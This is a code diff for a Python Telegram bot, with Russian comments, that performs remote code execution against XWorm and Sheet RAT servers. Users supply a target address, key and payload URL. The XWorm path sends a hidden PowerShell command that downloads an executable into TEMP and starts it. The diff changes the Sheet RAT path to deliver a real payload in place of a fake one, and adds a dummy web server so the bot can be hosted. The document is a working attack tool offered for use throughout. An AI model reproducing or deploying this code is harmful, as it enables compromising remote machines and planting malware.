@@ -11,6 +11,8 @@ import io
 import base64
 from datetime import datetime
 from typing import Dict, Optional
+from threading import Thread
+from http.server import HTTPServer, BaseHTTPRequestHandler
 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
 from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext
@@ -22,10 +24,10 @@ ALLOWED_USERS = set(map(int, os.getenv("ALLOWED_USERS", "").split(","))) if os.g
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ============ XWORM RCE ============
+# ============ XWORM RCE (СПЛ = <Xwormmm>) ============
 
 class XWormRCE:
-    def __init__(self, host: str, port: int, key: str, payload_url: str, spl: str = "|"):
+    def __init__(self, host: str, port: int, key: str, payload_url: str, spl: str = "<Xwormmm>"):
         self.host = host
         self.port = port
         self.key = key
@@ -59,6 +61,7 @@ class XWormRCE:
             self.socket.settimeout(timeout)
             loop = asyncio.get_event_loop()
             await loop.run_in_executor(None, self.socket.connect, (self.host, self.port))
+            logger.info(f"XWorm connected to {self.host}:{self.port}")
             return True
         except Exception as e:
             logger.error(f"XWorm connection failed: {e}")
@@ -82,12 +85,14 @@ class XWormRCE:
             session_id = self._random_string(8)
             temp_filename = self._random_string(6)
             
+            # Инициализация HRDP с правильным SPL
             init_msg = f"hrdp{self.spl}{session_id}"
             if not await self._send_packet(init_msg):
                 return "❌ Ошибка инициализации HRDP"
             
             await asyncio.sleep(0.3)
             
+            # PowerShell команда
             powershell_cmd = (
                 f'cmd /c start powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command '
                 f'$c=(New-Object Net.WebClient);$f="$env:TEMP\\{temp_filename}.exe";'
@@ -95,12 +100,14 @@ class XWormRCE:
                 f'Start-Process $f'
             )
             
+            # Отправка RCE команды
             cmd_msg = f"hrdp{self.spl}{session_id}{self.spl}1920{self.spl}1080{self.spl}{powershell_cmd}{self.spl}"
             if not await self._send_packet(cmd_msg):
                 return "❌ Ошибка отправки RCE команды"
             
             await asyncio.sleep(0.5)
             
+            # Закрытие
             close_msg = f"hrdp{self.spl}{session_id}{self.spl}{self.spl}{self.spl}{self.spl}"
             await self._send_packet(close_msg)
             
@@ -168,15 +175,25 @@ class SheetRATRCE:
             hwid = self._random_string(6)
             filename = self._random_string(8)
             
-            download_info = f"DownloadInfo<@>{hwid}<@>1024<@>{filename}.exe<@>false"
+            # Скачиваем реальный пейлоад по URL
+            import urllib.request
+            try:
+                with urllib.request.urlopen(self.payload_url, timeout=10) as response:
+                    payload_data = response.read()
+            except Exception as e:
+                return f"❌ Не удалось скачать пейлоад: {str(e)}"
+            
+            # Кодируем в base64 как в оригинале
+            payload_b64 = base64.b64encode(payload_data).decode('utf-8')
+            
+            # Отправляем DownloadInfo
+            download_info = f"DownloadInfo<@>{hwid}<@>{len(payload_data)}<@>{filename}.exe<@>false"
             if not await self._send(download_info):
                 return "❌ Ошибка отправки DownloadInfo"
             
             await asyncio.sleep(0.3)
             
-            fake_payload = self._random_string(100).encode('utf-8')
-            payload_b64 = base64.b64encode(fake_payload).decode('utf-8')
-            
+            # Отправляем DownloadGet
             download_get = f"DownloadGet<@>{payload_b64}<@>{filename}.exe"
             if not await self._send(download_get):
                 return "❌ Ошибка отправки DownloadGet"
@@ -196,7 +213,24 @@ async def liberium_rce(host: str, port: int, payload_url: str) -> str:
     return "🚧 **Liberium RAT** — временно недоступен. Требуется реверс LEB128 и TLS протокола."
 
 
-# ============ TELEGRAM БОТ (под версию 13.15) ============
+# ============ ФЕЙКОВЫЙ ВЕБ-СЕРВЕР ДЛЯ RENDER ============
+
+class HealthCheckHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"OK")
+    
+    def log_message(self, format, *args):
+        pass  # Заглушаем логи
+
+def run_health_server():
+    port = int(os.environ.get("PORT", 10000))
+    server = HTTPServer(("0.0.0.0", port), HealthCheckHandler)
+    server.serve_forever()
+
+
+# ============ TELEGRAM БОТ ============
 
 user_sessions: Dict[int, dict] = {}
 
@@ -266,7 +300,7 @@ def button_handler(update: Update, context: CallbackContext):
         user_sessions[user_id] = {"rat": rat_type, "step": "ip"}
         
         if rat_type == "xworm":
-            text = "🐛 **XWorm RCE**\n\nВведи цель в формате:\n`IP:PORT:KEY`\n\nПример: `192.168.1.100:54321:MySecretKey`"
+            text = "🐛 **XWorm RCE**\n\nВведи цель в формате:\n`IP:PORT:KEY`\n\nПример: `192.168.1.100:54321:123456789`\n\n⚠️ Ключ вводи БЕЗ скобок <>"
         elif rat_type == "sheet":
             text = "💀 **Sheet RAT RCE**\n\nВведи цель в формате:\n`IP:PORT`\n\nПример: `192.168.1.100:4444`"
         else:
@@ -295,7 +329,7 @@ def handle_message(update: Update, context: CallbackContext):
         if rat == "xworm":
             parts = text.split(":")
             if len(parts) != 3:
-                update.message.reply_text("❌ Формат: `IP:PORT:KEY`", parse_mode=ParseMode.MARKDOWN)
+                update.message.reply_text("❌ Формат: `IP:PORT:KEY`\nПример: `192.168.1.100:54321:123456789`", parse_mode=ParseMode.MARKDOWN)
                 return
             
             ip, port_str, key = parts
@@ -310,7 +344,7 @@ def handle_message(update: Update, context: CallbackContext):
             session["key"] = key
             session["step"] = "payload"
             
-            update.message.reply_text(f"✅ Цель: `{ip}:{port}`\n🔑 Ключ: `{key[:10]}...`\n\n📦 Введи URL пейлоада (.exe):")
+            update.message.reply_text(f"✅ Цель: `{ip}:{port}`\n🔑 Ключ: `{key[:10]}...`\n\n📦 Введи URL пейлоада (.exe или .bat):")
         
         else:
             if ":" not in text:
@@ -340,25 +374,19 @@ def handle_message(update: Update, context: CallbackContext):
         status_msg = update.message.reply_text("⚙️ **Выполнение RCE...**", parse_mode=ParseMode.MARKDOWN)
         
         try:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            
             if rat == "xworm":
-                loop = asyncio.new_event_loop()
-                asyncio.set_event_loop(loop)
                 rce = XWormRCE(session["ip"], session["port"], session["key"], payload_url)
                 result = loop.run_until_complete(rce.execute())
-                loop.close()
-            
             elif rat == "sheet":
-                loop = asyncio.new_event_loop()
-                asyncio.set_event_loop(loop)
                 rce = SheetRATRCE(session["ip"], session["port"], payload_url)
                 result = loop.run_until_complete(rce.execute())
-                loop.close()
-            
             else:
-                loop = asyncio.new_event_loop()
-                asyncio.set_event_loop(loop)
                 result = loop.run_until_complete(liberium_rce(session["ip"], session["port"], payload_url))
-                loop.close()
+            
+            loop.close()
             
             status_msg.edit_text(result, parse_mode=ParseMode.MARKDOWN)
             
@@ -381,6 +409,9 @@ def main():
     if not TELEGRAM_TOKEN:
         logger.error("TELEGRAM_TOKEN не задан!")
         return
+    
+    # Запускаем фейковый веб-сервер для Render в отдельном потоке
+    Thread(target=run_health_server, daemon=True).start()
     
     updater = Updater(TELEGRAM_TOKEN, use_context=True)
     dp = updater.dispatcher
